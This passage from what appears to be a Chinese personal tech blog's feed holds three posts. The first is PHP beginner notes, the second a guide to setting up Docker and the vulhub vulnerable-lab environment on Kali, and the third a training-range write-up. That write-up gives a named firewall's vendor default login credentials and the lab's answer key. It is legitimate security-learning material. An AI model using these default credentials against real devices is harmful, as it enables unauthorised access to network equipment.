title="类型转换"></a>类型转换</h2><ul><li>自动转换</li><li>手动转换（强制）：认为根据需要的目标类型转换<ul><li>强制转换规则：在变量之前增加一个括号(),然后在里面写上对应类型：int/integer,其中NULL类型用到unser()结构</li></ul></li><li>布尔true为1，false为0</li><li>字符串转数值<ul><li>以字母开头的字符串，永远为0</li><li>以数字开头的字符串，取到碰到字符串为止（不会同时包含两个小数点）</li></ul></li></ul><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//数据类型</span><br><span class="hljs-comment">//创建数据</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">'abc1.1.1'</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">'1.1.1abd'</span>;<br><span class="hljs-comment">//自动转换</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span> + <span class="hljs-variable">$b</span>;<br><span class="hljs-comment">//强制转换</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;br/&gt;'</span>,(<span class="hljs-keyword">float</span>)<span class="hljs-variable">$a</span>,(<span class="hljs-keyword">float</span>)<span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br>注：运行完页面有warning<br></code></pre></td></tr></tbody></table></figure><h2 id="类型判断"><a href="#类型判断" class="headerlink" title="类型判断"></a>类型判断</h2><p>通过类型判断函数来判断变量，最终返回这个变量所保存数据的数据类型：是一组以is_开头后面跟类型名字的函数：is_XXX(变量名)</p><p>Bool类型不能用echo查看，可以用var_dump结构查看</p><blockquote><p>echo只能输出变量的值,var_dump能将变量的值和类型同事输出</p></blockquote><pre><code class="hljs">var_dump(变量1,变量2)var_dump(is_int($a));var_dump(is_string($a)); # bool(false) bool(true)</code></pre><ul><li>gettype(变量名) ：获取类型，得到该类型对应字符串</li><li>settype(变量名，类型)：设定数据类型，与强制转换不同<ul><li>强制转换变量名，是对数据值复制的内容进行处理（不会处理实际存储的内容）</li><li>settype会直接改变数据本身</li></ul></li></ul><figure class="highlight elm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">echo</span> get<span class="hljs-keyword">type</span>($a); #string<br><span class="hljs-title">var_dump</span>(set<span class="hljs-keyword">type</span>($b,'int'));<br><span class="hljs-title">echo</span> get<span class="hljs-keyword">type</span>($b),$b; # stringbool(true) integer 1<br></code></pre></td></tr></tbody></table></figure><h2 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h2><p>4字节，最大32位，有符号类型（区分正负数）</p><p>四种整型定义：</p><pre><code class="hljs">$a=120 # 十进制$a=0b110 # 二进制$a=0120 # 八进制$a=0x120 # 十六进制</code></pre><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><pre><code class="hljs">Decbin() # 十转二Decoct() # 十转八Dechex() # 十转十六Bindec() # 二转十</code></pre><p>栗子：<br>    var_dump(decbin(107)) # string(7) “110101</p><h2 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h2><p>精度范围大概在15个有效数字左右</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$f1</span>=<span class="hljs-number">1.23</span>; <span class="hljs-comment"># float(1.23)</span><br><span class="hljs-variable">$f2</span>=<span class="hljs-number">1.23e10</span>; <span class="hljs-comment"># float(12300000000)</span><br><span class="hljs-variable">$f3</span>=PHP_INT_MAX +<span class="hljs-number">1</span>; <span class="hljs-comment"># float(9.2233720368548E+18) </span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$f1</span>,<span class="hljs-variable">$f2</span>,<span class="hljs-variable">$f3</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><h2 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h2><pre><code class="hljs">$b1=True;$b2=False;var_dump($b1,$b2);</code></pre><p>在进行某些数据判断时,要特别注意类型转换:</p><pre><code class="hljs">empty() # 判断数据的值是否为空,不是NULL,若为空返回true,不为空返回falselsset() # 判断数据存储的变量本身是否存在,存储</code></pre><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><p>运算符:operator</p><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><pre><code class="hljs">= 赋值运算,将右边结果保存到内存的某个位置,将位置的内存地址赋值给左侧的变量</code></pre><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p>加 <code>+</code></p><p>减 <code>-</code></p><p>乘 <code>*</code></p><p>除 <code>/</code></p><p>取余 <code>%</code></p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$a</span>=<span class="hljs-variable">$b</span>=<span class="hljs-number">10</span>; <span class="hljs-regexp">//</span>连贯赋值运算：俩变量不同<br><span class="hljs-variable">$c</span>=<span class="hljs-number">0</span>;<br>var_dump(<span class="hljs-variable">$a</span>/<span class="hljs-number">2</span>);<br></code></pre></td></tr></tbody></table></figure><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p>比较两个数据大小<br><code>&gt;、&gt;=、&lt;、&lt;=、==、!=、===、!==</code></p><p><code>===</code> 全等于，左右大小和类型都相同。</p><p><code>!==</code> 不全等于，只有大小或者类型不同。</p><pre><code class="hljs">$a='123';$b=123;var_dump($a==$b); // Truevar_dump($a===$b);// False</code></pre><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><ul><li>逻辑与：<code>&amp;&amp;</code> 全真为真</li><li>逻辑或：<code>||</code> 一真为真</li><li>逻辑非：<code>!</code> 取反</li></ul><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$a</span>=<span class="hljs-string">'weekend'</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">'goods'</span>;<br>var_dump(<span class="hljs-variable">$a</span> &amp;&amp; <span class="hljs-variable">$b</span>);<span class="hljs-regexp">//</span> True<br>var_dump(<span class="hljs-variable">$a</span> || <span class="hljs-variable">$b</span>);<span class="hljs-regexp">//</span> True<br>var_dump(!(<span class="hljs-variable">$b</span>==<span class="hljs-string">'good'</span>));<span class="hljs-regexp">//</span> True<br></code></pre></td></tr></tbody></table></figure><p>逻辑与和逻辑或又称为短路运算，若第一个表达式结果已经满足条件，那么就不会运行逻辑运算符后面的表达式。</p><h2 id="连接运算符"><a href="#连接运算符" class="headerlink" title="连接运算符"></a>连接运算符</h2><p>将字符串拼接：<code>.</code><br>    .= 复合运算，将左右连接，然后重新赋值给左边。</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$a</span>=<span class="hljs-string">'hello '</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-number">123</span>;<br>echo <span class="hljs-variable">$a</span> . <span class="hljs-variable">$b</span>,<span class="hljs-string">'&lt;hr/&gt;'</span>; <span class="hljs-regexp">//</span>将a和b连接起来<br><span class="hljs-variable">$a</span> .= <span class="hljs-variable">$b</span>; <span class="hljs-regexp">//</span><span class="hljs-variable">$a</span>=<span class="hljs-variable">$a</span> . <span class="hljs-variable">$b</span><br>echo <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></tbody></table></figure><h2 id="错误抑制符"><a href="#错误抑制符" class="headerlink" title="错误抑制符"></a>错误抑制符</h2><p>在php中一些错误可以提前预知，但错误无法避免，又不希望报错给用户，可以使用错误抑制扶处理。</p><pre><code class="hljs">@ 在可能出错的表达式前面使用即可</code></pre><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$a</span>=10;</span><br><span class="hljs-meta"><span class="hljs-keyword">$b</span>=0;</span><br>@(<span class="hljs-symbol">$</span>a/<span class="hljs-symbol">$</span>b);<br></code></pre></td></tr></tbody></table></figure><p>错误抑制符通常在生产环境用到；</p><h2 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h2><p>有三个表达式参与的运算（简单的分支结构缩写）</p><p>语法格式： 表达式1 ? 表达式2 : 表达式3;</p><p>运算：若1成立，那么执行2，否则执行3；</p><pre><code class="hljs">$a=10;$b=$a&gt;10?100:0;echo $b;</code></pre><h2 id="自操作运算符"><a href="#自操作运算符" class="headerlink" title="自操作运算符"></a>自操作运算符</h2><p><code>++ --</code></p><pre><code class="hljs">$a=1;$a++;//++$a;//前置后置若本身只有自操作不参与其他运算，那么效果相同$a=1;$b=$a++; // $a++会导致$a=$a+1=2;$b=1$c=++$a; // ++$a会导致$a=$a+1=2;$c=2后置自操作：先将自己所保存的值留下来，然后改变自己，自己给别人原来的值前置自操作：先改变自己，然后将改变后的值传递。&lt;?php$a=$b=1;$a++;//++$b;echo $a,'&lt;br/&gt;',$b;echo '&lt;br/&gt;',$a++,'&lt;br/&gt;',++$b;echo '&lt;br/&gt;',$a,$b;?&gt;/+=: 左边结果与右边结果相加后赋值给左边/-=: 左边减去右边的结果赋值给左边</code></pre><h1 id="计算机码"><a href="#计算机码" class="headerlink" title="计算机码"></a>计算机码</h1><p>计算机码：原码、反码、补码，数值本身最左边一位是用来充当符号位：正数为0，负数为1</p><p>原码：数据本身从十进制转换成二进制得到的结果</p><ul><li>正数：左符号位为0</li><li>负数：左符号位为1</li></ul><p>反码：针对负数，符号位不变，其他位取反</p><p>补码：针对负数，反码+1</p><p>系统中存在两个0：</p><ul><li><code>+0</code> : 00000000</li><li><code>-0</code> : 10000000 原码</li></ul><p>取反： 11111111</p><p>补码：00000000</p><h1 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h1><p>取出计算机中最小的单位(位bit)进行运算</p><p><code>&amp;</code> ：按位与，11则1</p><p><code>|</code> : 按位或，有1则1</p><p><code>~</code> : 按位非，1则0，0则1</p><p><code>^</code> : 按位异或，相同则0，不同则1</p><p><code>&lt;&lt;</code> : 按位左移，整个位(32位)，左移一位，右边补0(乘以2)</p><p><code>&gt;&gt;</code> : 按位右移，整个位右移，左边补符号位对应内容(正数补0，负数补1)（除以2）</p><p>注意：</p><ol><li>系统进行任何位运算的时候都是使用补码</li><li>运算结束之后都必须转换原码才是最终显示数据</li></ol><h1 id="优先级略"><a href="#优先级略" class="headerlink" title="优先级略"></a>优先级略</h1><h1 id="条件判断语句"><a href="#条件判断语句" class="headerlink" title="条件判断语句"></a>条件判断语句</h1><h2 id="if条件判断语句"><a href="#if条件判断语句" class="headerlink" title="if条件判断语句"></a>if条件判断语句</h2><pre><code class="hljs">if(条件表达式){    //执行代码段；}else{    //执行代码段；}if(条件表达式1){    //执行代码段；}elseif(条件表达式2){    //执行代码段；}else{    //执行代码段；}</code></pre><p>栗子：</p><pre><code class="hljs">&lt;?php    $day='sunday';    if($day=='sunday'){        echo 'play';    }else{        echo 'work';    }?&gt;&lt;?php    $day='sunday';    if($day=='sunday'){        echo 'play';    }elseif($day='Saturday'){        echo 'play!';    }else{        echo 'work';    }?&gt;</code></pre><h2 id="Switch分支语句"><a href="#Switch分支语句" class="headerlink" title="Switch分支语句"></a>Switch分支语句</h2><pre><code class="hljs">switch(条件表达式){    case 值1:        代码段；        break;    case 值2:        代码段；        break;    …    default:        //匹配失败的代码;        break;}</code></pre><p>栗子：</p><pre><code class="hljs">&lt;?php    $day=1;    switch ($day) {        case 1:            echo '1';            break;        case 2:            echo '2';            break;        case 3:            echo '3';            break;        default:            echo 'error';            break;    }?&gt;</code></pre><h1 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h1><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><pre><code class="hljs">for([条件1];[条件2];[条件3]){    //条件1：初始化，可以多种赋值语句，逗号分开    //条件2：边界判断，限定循环执行次数    //条件3：执行条件变化    循环体；}</code></pre><p>栗子：</p><pre><code class="hljs">&lt;?php    for($i=1;$i&lt;=10;$i++){        echo $i,'&lt;br/&gt;';    }?&gt;&lt;?php    for($i=1,$end=10;$i&lt;=$end;$i++){        echo $i,'&lt;br/&gt;';    }?&gt;</code></pre><h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><pre><code class="hljs">条件初始化；while(条件表达式){    //条件表达式就是判断边界条件    循环体；}</code></pre><p>例：</p><pre><code class="hljs">&lt;?php    $i=1;    while($i&lt;=10){        echo $i++,'&lt;br/&gt;';    }?&gt;</code></pre><p>do-while循环：先执行循环体后判断条件</p><pre><code class="hljs">do{    循环体}while(条件表达式)</code></pre><p>例：</p><pre><code class="hljs">&lt;?php    $i=1;    do{        if($i%2==0){            echo $i,'&lt;br/&gt;';            }    $i++;    }while($i&lt;=10);?&gt;</code></pre><h2 id="循环控制"><a href="#循环控制" class="headerlink" title="循环控制"></a>循环控制</h2><p>中断控制：continue</p><p>终止控制：break</p><pre><code class="hljs">&lt;?php    //输出1-100之间5的倍数    $i=1;    while($i&lt;=100){        if($i%5==0){            echo $i++,'&lt;br/&gt;';        }        $i++;        continue;        //break; 终止循环    }?&gt;</code></pre><ul><li><code>continue 2;</code> 当前自己循环后面内部不再执行，同时外部循环如果还有循环体也不再执行，重新来过。</li><li><code>break 2;</code> 当前循环和次外一层循环都结束</li></ul><h1 id="流程控制替代语法"><a href="#流程控制替代语法" class="headerlink" title="流程控制替代语法"></a>流程控制替代语法</h1><p>分支和循环结构的替代语法</p><p>php本身是嵌入到html中的脚本语言，需要在html中书写一些关于判断或者循环的结构语法，必须符合php标签规范，需要html和php进行混搭，如果使用原始的php代码那么会非常不美观。</p><p>例子：打印九九乘法表，使用表格来展示。</p><pre><code class="hljs">&lt;table border=1&gt;    &lt;?php for($i=1;$i&lt;10;$i++){?&gt;        &lt;tr&gt;            &lt;?php for($j=1;$j&lt;=$i;$j++){?&gt;                &lt;td&gt;                    &lt;?php echo $i.' * '.$j.' = '.$i*$j;?&gt;                &lt;/td&gt;            &lt;?php }?&gt;        &lt;/tr&gt;    &lt;?php }?&gt;&lt;/table&gt;</code></pre><p>在php书写html中大括号<code>{}</code>不美观，所以php提供了一种替代机制：</p><pre><code class="hljs">for(;;){ -&gt;  for(;;):}        -&gt;  endfor;</code></pre><p>例子：</p><pre><code class="hljs">&lt;?php for($j=1;$j&lt;=$i;$j++):?&gt;    &lt;td&gt;        &lt;?php echo $i.' * '.$j.' = '.$i*$j;?&gt;    &lt;/td&gt;&lt;?php endfor;?&gt;</code></pre><p>左大括号用冒号替代</p><p>右大括号使用end+对应实际标记替代</p><pre><code class="hljs">if(): endif;switch: endswitch;</code></pre><h1 id="常用系统函数"><a href="#常用系统函数" class="headerlink" title="常用系统函数"></a>常用系统函数</h1><h3 id="输出函数"><a href="#输出函数" class="headerlink" title="输出函数"></a>输出函数</h3><pre><code class="hljs">print() # 类似echo输出，本质时一种结构，返回1，可以不用括号print_r() # 类似var_dump，但比var_dump简单，不会输出数据类型，指挥输出值 &lt;?php    echo print('hello&lt;br/&gt;');    print 'hello1&lt;br/&gt;';    $a='hello1&lt;br/&gt;';    print_r($a);?&gt;</code></pre><h3 id="时间函数"><a href="#时间函数" class="headerlink" title="时间函数"></a>时间函数</h3><pre><code class="hljs">date() # 按照指定格式对对应的时间戳（从1970年格林统治时间开始计算的秒数）time() # 获取当前时间对应的时间戳(返回1970年1月1日00：00：00到当前时间的秒数）microtimw() # 获取微秒级别的时间strtotime() # 按照规定格式的字符串转换成时间戳echo date('Y 年 m 月 d 日 H:i:s&lt;br/&gt;',12345678);echo time(),'&lt;br/&gt;';echo microtime();echo strtotime('tomorrow 10 hours');结果:1970 年 05 月 24 日 05:21:181671415876/0.29940200 16714158761671501600 </code></pre><h3 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h3><pre><code class="hljs">max() # 返回参数最大值min() # 返回参数最小值rand() # 返回一个随机值mt_rand() # 与rand一样,但底层结构不同,效率高于randround() # 四舍五入ceil() # 向上取整floor() # 向下取整pow() # 求指定数字的指定指数次结果abs() # 求绝对值sqrt() # 求平方根</code></pre><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><pre><code class="hljs">function_exists() # 判断指定函数名字是否在内存中存在func_get_arg() # 在自定义函数种获取指定数值对应的参数func_get_args() # 在自定义函数中获取所有的参数(数组)func_num_args() # 获取当前自定义函数的参数数量</code></pre><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>文件包含：在php脚本中，去将另一个文件(php)包含进来，去合作完成一件事情</p><p>文件包含作用：</p><ol><li>要么使用被包含文件中的内容，实现代码共享(重用)：向上包含(索要)<ol><li>向上包含：在当前脚本要用某个代码之前包含别的文件</li></ol></li><li>要么自己有东西可以给别的文件使用，实现代码的共享（重用）：向下包含(给予)<ol><li>向下包含：在自己有某个东西的时候，需要别的脚本来显示（自己代码写完之后包含其他文件）</li></ol></li></ol><p>最大作用：分工协作，每个脚本做的事情不一样，因此可以使用协作方式，让多个脚本共同完成一件事情</p><h2 id="文件包含四种形式"><a href="#文件包含四种形式" class="headerlink" title="文件包含四种形式"></a>文件包含四种形式</h2><pre><code class="hljs">include # 包含文件include_once # 系统自动判断文件包含过程中，是否已经包含过（一个文件最多被包含一次）requrie # 与include相同require_once # 与include_once相同</code></pre><p>包含基本语法：</p><pre><code class="hljs">include '文件名字';include('文件名字');</code></pre><p>例：(向上包含：先包含文件，后使用文件中内容，运行demo2.php)</p><p>demo1.php</p><pre><code class="hljs">&lt;?php//被包含数据$a=1;define('PI',3.14);?&gt;</code></pre><p>demo2.php</p><pre><code class="hljs">&lt;?php//包含文件include 'demo1.php'; //包含当前文件demo2.php所在文件夹下的demo1.phpecho $a,'&lt;br/&gt;',PI;?&gt;</code></pre><p>例：（向下包含：先准备内容，然后包含另外的文件，在另外的文件中使用当前内容,运行demo1.php）</p><p>demo1.php</p><pre><code class="hljs">&lt;?php//被包含数据$a=10;const PI=3.14;include_once 'demo2.php';?&gt;</code></pre><p>demo2.php</p><pre><code class="hljs">&lt;table&gt;    &lt;tr&gt;        &lt;td&gt;&lt;?php echo $a;?&gt;&lt;/td&gt;        &lt;td&gt;&lt;?php echo PI;?&gt;&lt;/td&gt;    &lt;/tr&gt;&lt;/table&gt;</code></pre><h2 id="文件加载原理"><a href="#文件加载原理" class="headerlink" title="文件加载原理"></a>文件加载原理</h2><p>php代码执行流程：</p><ol><li>读取代码文件（php程序）</li><li>编译：将php代码转换成字节码(生成opcode)</li><li>zendengine解析opcode，按照字节码去进行逻辑运算</li><li>转换成对应的html代码</li></ol><p>文件加载原理：</p><ol><li>在文件加载时，系统会自动的将被包含文件中的代码相当于嵌入到当前文件中</li><li>加载位置，在哪加载，对应的文件中的代码嵌入位置就是对应的include位置</li><li>在php中被包含的文件是单独进行编译的</li></ol><p>php文件在编译过程中如果出现语法错误，那么会失败(不会执行)；但如果被包含文件有错误的时候，系统会在执行到包含include这条语句的时候才会报错。</p><h2 id="include-和-require区别"><a href="#include-和-require区别" class="headerlink" title="include 和 require区别"></a>include 和 require区别</h2><p>include 和 include_once的区别：</p><p>include：系统会碰到一次执行一次，若对统一个文件进行多次加载，那么系统会执行多次；</p><p>include_once：系统碰到多次，也只会执行一次。</p><p>require 和include的区别，本质都是包含文件，唯一的区别在于包含不到文件时候，报错形式不一样</p><p>include错误级别比较轻，不会阻止代码运行</p><pre><code class="hljs">include 'a.php';require 'a.php';</code></pre><h2 id="文件包加载路径"><a href="#文件包加载路径" class="headerlink" title="文件包加载路径"></a>文件包加载路径</h2><p>文件在加载时候需要指定文件路径才能保证php正确的找到对应的文件。</p><ul><li>绝对路径：<ul><li>从磁盘的根目录开始（本地绝对路径）</li><li>windows C:/路径/PHP文件</li><li>Linux /路径/PHP文件</li><li>从网站根目录开始（网络绝对路径）</li><li><code>/</code>相对于网站主机名字对应的路径</li><li><code>localhost/index.php -&gt; E:/server/apache/htdocs/index.php</code></li></ul></li><li>相对路径：从当前文件所在目录开始的路径<ul><li><code>.|./</code> 表示当前文件夹</li><li><code>../</code> 上级目录（当前文件夹的上一层文件夹）</li></ul></li></ul><p>绝对路径和相对路径的加载区别</p><ol><li>绝对路径相对效率偏低，但是相对安全（路径不会出问题）</li><li>相对路径相对效率高，但是容易出错（相对路径会发生改变）</li></ol><p>例：</p><pre><code class="hljs">//相对路径加载include_once 'demo2.php';//默认当前文件本身echo $a;include_once './demo2.php';//当前目录文件夹</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;网站基本概念&quot;&gt;&lt;a href=&quot;#网站基本概念&quot; class=&quot;headerlink&quot; title=&quot;网站基本概念&quot;&gt;&lt;/a&gt;网站基本概念&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;服务器：提供计算机服务的机器，取决于机器上所安装的软件（服务软件）&lt;ol&gt;
&lt;li&gt;web服务器</summary>
      
    
    
    
    
    <category term="php" scheme="https://sinky.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Kali安装vulhub</title>
    <link href="https://sinky.top/2022/11/21/Kali%E5%AE%89%E8%A3%85vulhub/"/>
    <id>https://sinky.top/2022/11/21/Kali%E5%AE%89%E8%A3%85vulhub/</id>
    <published>2022-11-21T01:23:59.283Z</published>
    <updated>2022-11-24T01:55:50.473Z</updated>
    
    <content type="html"><![CDATA[<p>再搭一个靶场，基于docker和docker-compose的漏洞环境集合。</p><h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><p>切root用户：</p><pre><code class="hljs">apt-get update #更新apt-get install -y apt-transport-https ca-certificates #安装https协议、CA证书apt install docker.io # 安装dockerdocker -v # 查看是否安装成功systemctl start docker # 启动dockerdocker ps -a # 查看docker信息</code></pre><h1 id="安装pip和docker-compose"><a href="#安装pip和docker-compose" class="headerlink" title="安装pip和docker-compose"></a>安装pip和docker-compose</h1><pre><code class="hljs">apt-get install python3-pip # 安装pippip3 install docker-compose # 安装docker-composedocker-compose -v # 查看版本信息</code></pre><h1 id="安装vulhub"><a href="#安装vulhub" class="headerlink" title="安装vulhub"></a>安装vulhub</h1><pre><code class="hljs">git clone https://github.com/vulhub/vulhub.git # 下载vulhubcd vulhub lscd rails/CVE-2019-5418 # 随便进入一个靶场docker-compose up -d # 开启靶场环境</code></pre><p>哦豁，失败，我就说我怎么可能搭建环境这么顺利。<br>切换了root，就可以了，等了好一会儿开启</p><p><img src="https://s2.loli.net/2022/11/22/3uqSHPgRDlUCNpY.png" alt="image.png"></p><p>查看靶场启动环境 <code>docker-compose ps -a</code><br>查看该环境运行的端口</p><p>然后连接一下网址：<code>http://kali的ip:端口/</code></p><p><img src="https://s2.loli.net/2022/11/22/D8ap4yEcRSrixnO.png" alt="image.png"></p><p>关闭环境：<code>docker-compose down</code></p><p><img src="https://s2.loli.net/2022/11/22/jInPGpJxXWTs2cA.png" alt="image.png"></p><pre><code class="hljs">重启docker：systemctl restart docker关闭docker：systemctl stop dockersystemctl stop docker.socket查看docker运行时状态：systemctl status docker</code></pre><p>（这次搭建靶场顺利到不可思议！！！）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;再搭一个靶场，基于docker和docker-compose的漏洞环境集合。&lt;/p&gt;
&lt;h1 id=&quot;安装docker&quot;&gt;&lt;a href=&quot;#安装docker&quot; class=&quot;headerlink&quot; title=&quot;安装docker&quot;&gt;&lt;/a&gt;安装docker&lt;/h1&gt;&lt;p&gt;</summary>
      
    
    
    
    
    <category term="docker" scheme="https://sinky.top/tags/docker/"/>
    
    <category term="vulhub" scheme="https://sinky.top/tags/vulhub/"/>
    
    <category term="环境搭建" scheme="https://sinky.top/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>靶场：某防火墙默认口令</title>
    <link href="https://sinky.top/2022/11/15/%E9%9D%B6%E5%9C%BA%EF%BC%9A%E6%9F%90%E9%98%B2%E7%81%AB%E5%A2%99%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/"/>
    <id>https://sinky.top/2022/11/15/%E9%9D%B6%E5%9C%BA%EF%BC%9A%E6%9F%90%E9%98%B2%E7%81%AB%E5%A2%99%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/</id>
    <published>2022-11-15T05:53:43.820Z</published>
    <updated>2022-11-22T08:51:27.884Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>安全工程师”墨者”对某公司进行授权测试时，扫描公网IP时发现当前公司在网络边界部署了某型号防火墙，并且公网可以访问防火墙的WEB页面。</p><p>实训目标</p><ol><li>掌握查看当前设备类型的方法；</li><li>了解网络（安全）设备的登录控制方式；</li><li>了解网络（安全）设备的默认口令获取方式；</li><li>了解当前型号防火墙的不同账户的区别；</li><li>了解在网络信息安全中的权限最小化、权限分离作用；</li></ol><p>解题方向</p><p>找到防火墙的默认口令进行登录。</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>题目给了一个登录界面，我注意到题目标题：天清汉马，那就百度搜了一下天清汉马防火墙的默认账号密码</p><p>账号：useradmin</p><p>密码：venus.user</p><p>然后……就拿到key了！</p><pre><code class="hljs">KEY: mozhedf5bfbb87e52d81d6c658bda251</code></pre><p>说实话这不值得我花三个币！！！</p><h1 id="拓展-防火墙"><a href="#拓展-防火墙" class="headerlink" title="拓展 防火墙"></a>拓展 防火墙</h1><p>防火墙是指设置在不同网络或网络安全域之间的一系列部件的组合，它可以通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，以此来实现网络的安全保护，在逻辑上，防火墙是一个分离器，一个限制器，也是一个分析器，有效的监控了内部网和Internet之间的任何活动，保证了内部网络的安全。</p><p>防火墙，一个硬件设备或软件系统，主要架设在内部网络和外部网络间，为了防止外界恶意程序对内部系统的破坏，或者组织内部重要信息向外流出，有双向监督的功能。</p><h2 id="防火墙的分类及原理"><a href="#防火墙的分类及原理" class="headerlink" title="防火墙的分类及原理"></a>防火墙的分类及原理</h2><h3 id="包过滤技术"><a href="#包过滤技术" class="headerlink" title="包过滤技术"></a>包过滤技术</h3><p>包过滤技术是一种简单、有效的安全控制技术，它工作在网络层，通过在为网络间相互连接的设备上加载允许、禁止来自某些特定的源地址、目的地址、TCP端口号等规则，对通过设备的数据包进行检查，限制数据包进出内部网络</p><p>包过滤技术的优点是对用户透明，传输性能高，但由于安全控制层次在网络层、传输层，安全控制力度也只限于源地址、目的地址和端口号，因而只能进行较为初步的安全控制。</p><h3 id="应用代理技术"><a href="#应用代理技术" class="headerlink" title="应用代理技术"></a>应用代理技术</h3><p>应用代理防火墙工作在OSI的第七层，它通过检查所有应用层的信息包，并将检查的内容信息放入决策过程，从而提高网络的安全性。</p><p>应用网关防火墙是通过打破客户机/服务器模式实现的。每个客户机/服务器通信需要两个二连接：从客户端到防火墙，从防火墙到服务器。</p><p>另外，每个代理需要一个不同的应用进程，或一个后台运行的服务程序，对每个新的应用必须添加针对此应用的服务程序，否则不能使用该服务</p><p>所以，应用网关防火墙具有可伸缩性差的缺点。</p><h3 id="状态检测技术"><a href="#状态检测技术" class="headerlink" title="状态检测技术"></a>状态检测技术</h3><p>状态检测防火墙工作在OSI的第二至四层，采用状态检测包过滤的技术，是传统包过滤功能扩展而来。状态检测防火墙在网络层有一个检查引擎截获数据包并抽取出与应用层状态有关的信息，并以此为依据决定对该连接是接受还是拒绝，这种技术提供了高度安全的解决方案，同事具有较好的适应性和扩展性。</p><p>状态检测防火墙基本保持了简单包过滤防火墙的优点，性能较好，同时在防火墙的核心部分建立状态连接表，维护了连接，将进出昂罗的数据当成一个个的时间来处理，主要特点是由于缺乏对应用层协议的深度检测功能，无法彻底识别数据包中大量的垃圾邮件、广告以及木马程序等。</p><h3 id="完全内容检测技术"><a href="#完全内容检测技术" class="headerlink" title="完全内容检测技术"></a>完全内容检测技术</h3><p>完全内容检测技术防火墙综合状态检测与应用代理技术，并基于多层检测架构，把防病毒、内容过滤，应用识别等功能整合到防火墙中，还包括IPS功能，在网络边界实施OSI第七层的内容扫描，实现了实时在网络边缘部署病毒防护、内容过滤等应用层服务措施。</p><p>完全内容检测技术防火墙可以检测整个数据包内容，根据需要建立连接状态表，网络层保护强，应用层控制细等有点，但由于功能集成度高，对产品硬件要求较高</p><h2 id="防火墙作用"><a href="#防火墙作用" class="headerlink" 